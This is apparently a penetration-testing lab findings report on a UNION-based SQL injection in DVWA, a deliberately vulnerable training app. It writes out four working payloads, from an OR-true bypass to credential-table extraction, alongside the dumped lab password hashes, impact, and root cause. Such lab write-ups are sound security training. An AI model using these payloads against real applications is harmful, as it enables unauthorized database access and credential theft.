# Findings — SQL Injection Lab

## Vulnerability
**Type:** SQL Injection (In-band, UNION-based)
**Location:** `/vulnerabilities/sqli/?id=` (User ID parameter, GET)
**CWE:** CWE-89 — Improper Neutralization of Special Elements used in an SQL Command
**Severity:** Critical
**CVSS 3.1 (estimated):** 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

## Description
The "User ID" parameter in DVWA's SQL Injection module is concatenated directly into a SQL query without sanitization or parameterization. This allows an attacker to alter query logic, enumerate the underlying database structure, and extract arbitrary data — including the full contents of the `users` credential table — with no authentication bypass technique beyond a single crafted request.

## Evidence

### 1. Authentication logic bypass
**Payload:** `1' OR '1'='1`

Returned all 5 user records instead of the single expected record for `id=1`:

| First Name | Surname |
|---|---|
| admin | admin |
| Gordon | Brown |
| Hack | Me |
| Pablo | Picasso |
| Bob | Smith |

### 2. Database fingerprinting
**Payload:** `1' UNION SELECT database(),version()-- -`

| Database | Version |
|---|---|
| dvwa | 10.1.26-MariaDB-0+deb9u1 |

### 3. Schema enumeration
**Payload:** `1' UNION SELECT table_name,table_schema FROM information_schema.tables WHERE table_schema=database()-- -`

| Table Name | Schema |
|---|---|
| guestbook | dvwa |
| users | dvwa |

### 4. Credential extraction
**Payload:** `1' UNION SELECT user,password FROM users-- -`

| Username | Password Hash (MD5) | Cracked Value |
|---|---|---|
| admin | `5f4dcc3b5aa765d61d8327deb882cf99` | password |
| gordonb | `e99a18c428cb38d5f260853678922e03` | abc123 |
| 1337 | `8d3533d75ae2c3966d7e0d4fcc69216b` | charley |
| pablo | `0d107d09f5bbe40cade3de5c71e9e9b7` | letmein |
| smithy | `5f4dcc3b5aa765d61d8327deb882cf99` | password |

## Impact
- **Confidentiality:** Complete — full credential table exfiltrated, including the admin account.
- **Integrity:** High — the same injection point could be leveraged for `UPDATE`/`INSERT` if write permissions exist for the DB user, or for further lateral queries against other schemas.
- **Availability:** Potentially high — depending on DB privileges, stacked queries or heavy subqueries could be used for denial-of-service.
- **Compounding factor:** Passwords are stored as unsalted MD5, meaning even without this injection, a database leak from any other vector (backup exposure, misconfigured export, etc.) would result in near-instant credential recovery via rainbow tables.

## Root Cause
User-supplied input is concatenated directly into a SQL query string rather than passed as a bound parameter. No input validation, escaping, or allow-listing is applied to the `id` parameter server-side.
